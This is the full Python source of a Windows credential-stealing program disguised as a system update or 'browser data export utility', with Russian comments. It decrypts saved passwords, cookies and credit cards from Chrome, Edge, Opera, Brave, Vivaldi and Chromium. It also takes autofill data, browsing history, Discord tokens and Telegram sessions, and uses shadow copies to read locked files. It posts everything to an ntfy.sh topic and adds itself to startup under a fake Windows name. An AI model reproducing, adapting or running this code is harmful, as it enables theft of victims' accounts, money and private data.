# SystemUpdate.exe - Advanced Browser Data Export Utility
import os, json, base64, sqlite3, shutil, zipfile, tempfile, subprocess, re, time, socket, platform, ctypes
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import win32crypt, win32file, win32api, win32con, requests

# ===================== НАСТРОЙКИ =====================
TOPIC = "stealer919288373739105"
NTFY_URL = f"https://ntfy.sh/{TOPIC}"
TEMP = tempfile.gettempdir()
OUTPUT = os.path.join(TEMP, "SystemReport")
os.makedirs(OUTPUT, exist_ok=True)
RETRY_FILE = os.path.join(OUTPUT, "retry.json")
CHUNK_SIZE = 3500  # максимальный размер одного сообщения ntfy

# ===================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====================

def safe_copy(src, dst):
    """Копирует файл через VSS если прямое копирование не удалось."""
    try:
        shutil.copy2(src, dst)
        return True
    except (PermissionError, OSError):
        # пробуем VSS
        return vss_copy(src, dst)

def vss_copy(src, dst):
    """Создаёт теневую копию диска, копирует файл оттуда, затем удаляет копию."""
    drive = os.path.splitdrive(src)[0] + "\\"
    snapshot_id = None
    try:
        # Создаём снапшот
        res = subprocess.run(
            f'vssadmin create shadow /for={drive}',
            capture_output=True, text=True, shell=True, timeout=30
        )
        for line in res.stdout.splitlines():
            if "Shadow Copy ID" in line:
                snapshot_id = line.strip().split("{")[1].split("}")[0]
                snapshot_id = "{" + snapshot_id + "}"
                break
        if not snapshot_id:
            return False

        # Получаем путь к снапшоту
        res2 = subprocess.run(
            f'vssadmin list shadows /for={drive}',
            capture_output=True, text=True, shell=True, timeout=30
        )
        snap_volume = None
        for line in res2.stdout.splitlines():
            if "Shadow Copy Volume" in line:
                snap_volume = line.strip().split(":")[-1].strip().rstrip("\\")
                break
        if not snap_volume:
            return False

        # Переводим путь в снапшот
        # Например, C:\Users\... -> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users\...
        rel_path = os.path.relpath(src, drive)
        snap_path = os.path.join(snap_volume, rel_path)
        if os.path.exists(snap_path):
            shutil.copy2(snap_path, dst)
            return True

        # Альтернативный метод через символьную ссылку (упрощённо)
        # Пропускаем, если не получилось
        return False

    except Exception:
        return False
    finally:
        if snapshot_id:
            subprocess.run(f'vssadmin delete shadows /shadow={snapshot_id} /quiet',
                           shell=True, capture_output=True)

def get_key(local_state_path):
    """Извлекает мастер-ключ шифрования из Local State."""
    with open(local_state_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])
    return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]

def find_key_in_base(base_path):
    """Ищет Local State в корне папки браузера, а также в подпрофилях."""
    local = os.path.join(base_path, "Local State")
    if os.path.exists(local):
        return get_key(local)
    # Ищем в первом попавшемся профиле где есть Local State
    for d in os.listdir(base_path):
        path = os.path.join(base_path, d, "Local State")
        if os.path.isfile(path):
            return get_key(path)
    return None

def decrypt(buff, key):
    """Расшифровка пароля/куки/карты."""
    if not buff:
        return b''
    if buff.startswith(b'v10') or buff.startswith(b'v11'):
        iv, ct, tag = buff[3:15], buff[15:-16], buff[-16:]
        return AESGCM(key).decrypt(iv, ct + tag, None)
    # v20 пока не поддерживается, но можно добавить
    return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]

def get_profiles(base):
    """Возвращает список (имя, полный путь) всех профилей."""
    profiles = []
    if not os.path.exists(base):
        return profiles
    for d in os.listdir(base):
        path = os.path.join(base, d)
        if os.path.isdir(path) and (os.path.exists(os.path.join(path, 'Login Data')) or
                                    os.path.exists(os.path.join(path, 'Web Data'))):
            profiles.append((d, path))
    return profiles

def write_report(filename, lines):
    if lines:
        with open(os.path.join(OUTPUT, filename), 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))

# ===================== СБОР ДАННЫХ =====================

def steal_passwords(profile_path, key, browser):
    result = []
    db = os.path.join(profile_path, 'Login Data')
    if not os.path.exists(db):
        return result
    tmp = os.path.join(TEMP, f"psw_{os.urandom(4).hex()}.db")
    if not safe_copy(db, tmp):
        return result
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, pwd in cur.fetchall():
            if user and pwd:
                try:
                    result.append(f"{url} | {user} | {decrypt(pwd, key).decode(errors='ignore')}")
                except:
                    pass
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return result

def steal_cookies(profile_path, key, browser):
    result = []
    db_candidates = [os.path.join(profile_path, 'Network', 'Cookies'), os.path.join(profile_path, 'Cookies')]
    db = None
    for cand in db_candidates:
        if os.path.exists(cand):
            db = cand
            break
    if not db:
        return result
    tmp = os.path.join(TEMP, f"cook_{os.urandom(4).hex()}.db")
    if not safe_copy(db, tmp):
        return result
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, val in cur.fetchall():
            try:
                result.append(f"{host}\t{name}\t{decrypt(val, key).decode(errors='ignore')}")
            except:
                pass
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return result

def steal_cards(profile_path, key, browser):
    result = []
    db = os.path.join(profile_path, 'Web Data')
    if not os.path.exists(db):
        return result
    tmp = os.path.join(TEMP, f"card_{os.urandom(4).hex()}.db")
    if not safe_copy(db, tmp):
        return result
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        for name, month, year, num in cur.fetchall():
            try:
                num_dec = decrypt(num, key).decode(errors='ignore') if num else ''
                result.append(f"{num_dec} | {name} | {month}/{year}")
            except:
                pass
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return result

def steal_autofill(profile_path, browser):
    result = []
    db = os.path.join(profile_path, 'Web Data')
    if not os.path.exists(db):
        return result
    tmp = os.path.join(TEMP, f"auto_{os.urandom(4).hex()}.db")
    if not safe_copy(db, tmp):
        return result
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT name, value FROM autofill")
        for name, val in cur.fetchall():
            if name and val:
                result.append(f"{name} = {val}")
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return result

def steal_history(profile_path, browser):
    result = []
    db = os.path.join(profile_path, 'History')
    if not os.path.exists(db):
        return result
    tmp = os.path.join(TEMP, f"hist_{os.urandom(4).hex()}.db")
    if not safe_copy(db, tmp):
        return result
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 500")
        for url, title, count in cur.fetchall():
            result.append(f"{url} | {title} | visits: {count}")
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return result

def steal_downloads(profile_path, browser):
    result = []
    db = os.path.join(profile_path, 'History')
    if not os.path.exists(db):
        return result
    tmp = os.path.join(TEMP, f"down_{os.urandom(4).hex()}.db")
    if not safe_copy(db, tmp):
        return result
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 200")
        for path, url in cur.fetchall():
            result.append(f"{path} | from: {url}")
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return result

def steal_discord_tokens():
    """Извлекает токены Discord из LevelDB всех установленных экземпляров."""
    tokens = []
    base_discord = os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb"
    if os.path.exists(base_discord):
        tokens.extend(extract_tokens_from_leveldb(base_discord))
    # Другие варианты (PTB, Canary)
    for variant in ["DiscordPTB", "DiscordCanary"]:
        path = os.path.expanduser("~") + rf"\AppData\Roaming\{variant}\Local Storage\leveldb"
        if os.path.exists(path):
            tokens.extend(extract_tokens_from_leveldb(path))
    return tokens

def extract_tokens_from_leveldb(leveldb_path):
    found = []
    for filename in os.listdir(leveldb_path):
        if not filename.endswith(('.ldb', '.log')):
            continue
        filepath = os.path.join(leveldb_path, filename)
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
                # простой regex: dQw4w9WgXcQ или [A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}
                matches = re.findall(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
                for m in matches:
                    token = m.decode(errors='ignore')
                    if token not in found:
                        found.append(token)
        except Exception:
            continue
    return found

def steal_telegram_session():
    """Ищет папки Telegram Desktop (tdata) и копирует их."""
    # не расшифровываем, просто копируем папку
    tg_path = os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata"
    if os.path.exists(tg_path):
        dest = os.path.join(OUTPUT, "Telegram")
        if os.path.exists(dest):
            shutil.rmtree(dest, ignore_errors=True)
        shutil.copytree(tg_path, dest, ignore=shutil.ignore_patterns('user_data', 'Dumps'))
        return [f"Telegram session copied to {dest}"]
    return []

# ===================== СИСТЕМНАЯ ИНФОРМАЦИЯ =====================

def get_external_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return socket.gethostbyname(socket.gethostname())

def system_info():
    info = []
    info.append(f"Computer: {os.environ.get('COMPUTERNAME', '?')}")
    info.append(f"User: {os.environ.get('USERNAME', '?')}")
    info.append(f"OS: {platform.platform()}")
    info.append(f"External IP: {get_external_ip()}")
    info.append(f"Time: {datetime.now()}")
    return info

# ===================== ОТПРАВКА И ПОВТОР =====================

def chunk_lines(lines, max_bytes):
    """Разбивает список строк на куски, каждый размером <= max_bytes, сохраняя целые строки."""
    chunks = []
    current = []
    current_size = 0
    for line in lines:
        line_len = len(line.encode('utf-8')) + 1  # +1 для \n
        if current_size + line_len > max_bytes and current:
            chunks.append('\n'.join(current))
            current = []
            current_size = 0
        current.append(line)
        current_size += line_len
    if current:
        chunks.append('\n'.join(current))
    return chunks

def send_to_ntfy(title, lines):
    if not lines:
        return
    # сохраняем для возможного повтора
    try:
        with open(RETRY_FILE, 'r', encoding='utf-8') as f:
            retry_data = json.load(f)
    except:
        retry_data = []
    for chunk in chunk_lines(lines, CHUNK_SIZE):
        try:
            resp = requests.post(NTFY_URL,
                                  data=chunk.encode('utf-8'),
                                  headers={
                                      "Title": f"{title} ({len(chunk)} bytes)",
                                      "Tags": "computer"
                                  },
                                  timeout=10)
            if resp.status_code != 200:
                retry_data.append({"title": title, "data": chunk})
        except:
            retry_data.append({"title": title, "data": chunk})
    if retry_data:
        with open(RETRY_FILE, 'w', encoding='utf-8') as f:
            json.dump(retry_data, f)
    elif os.path.exists(RETRY_FILE):
        os.remove(RETRY_FILE)

def flush_retry():
    """Отправить всё, что не удалось отправить ранее."""
    if not os.path.exists(RETRY_FILE):
        return
    with open(RETRY_FILE, 'r', encoding='utf-8') as f:
        entries = json.load(f)
    remaining = []
    for e in entries:
        try:
            requests.post(NTFY_URL,
                          data=e['data'].encode('utf-8'),
                          headers={"Title": "[RETRY] " + e['title']},
                          timeout=10)
        except:
            remaining.append(e)
    if remaining:
        with open(RETRY_FILE, 'w', encoding='utf-8') as f:
            json.dump(remaining, f)
    else:
        os.remove(RETRY_FILE)

# ===================== АВТОЗАПУСК =====================

def add_to_startup():
    """Добавляет исполняемый файл в автозагрузку текущего пользователя."""
    try:
        exe = os.path.abspath(__file__)
        if exe.endswith('.py'):
            exe = sys.executable
        key = win32api.RegOpenKey(
            win32con.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(key, "WindowsSystemUpdate", 0, win32con.REG_SZ, exe)
        win32api.RegCloseKey(key)
        return True
    except:
        return False

# ===================== ГЛАВНЫЙ ЦИКЛ =====================

def main():
    # Пытаемся отправить накопившиеся ранее данные
    flush_retry()

    # Системная информация
    send_to_ntfy("SystemInfo", system_info())

    # Список браузеров
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
    }

    for browser_name, base_path in browsers.items():
        if not os.path.exists(base_path):
            continue
        key = find_key_in_base(base_path)
        if not key:
            continue

        profiles = get_profiles(base_path)
        for profile_name, profile_path in profiles:
            tag = f"{browser_name}/{profile_name}"

            send_to_ntfy(f"Passwords ({tag})", steal_passwords(profile_path, key, browser_name))
            send_to_ntfy(f"Cookies ({tag})", steal_cookies(profile_path, key, browser_name))
            send_to_ntfy(f"Cards ({tag})", steal_cards(profile_path, key, browser_name))
            send_to_ntfy(f"Autofill ({tag})", steal_autofill(profile_path, browser_name))
            send_to_ntfy(f"History ({tag})", steal_history(profile_path, browser_name))
            send_to_ntfy(f"Downloads ({tag})", steal_downloads(profile_path, browser_name))

    # Токены Discord
    discord_tokens = steal_discord_tokens()
    if discord_tokens:
        send_to_ntfy("DiscordTokens", [f"Token: {t}" for t in discord_tokens])

    # Сессия Telegram
    tg_sessions = steal_telegram_session()
    if tg_sessions:
        send_to_ntfy("Telegram", tg_sessions)

    # Автозапуск (тихо)
    add_to_startup()

    # Финальное оповещение
    requests.post(NTFY_URL,
                  data=f"Export complete at {datetime.now()}",
                  headers={"Title": "Export Done", "Tags": "white_check_mark"},
                  timeout=10)

if __name__ == "__main__":
    main()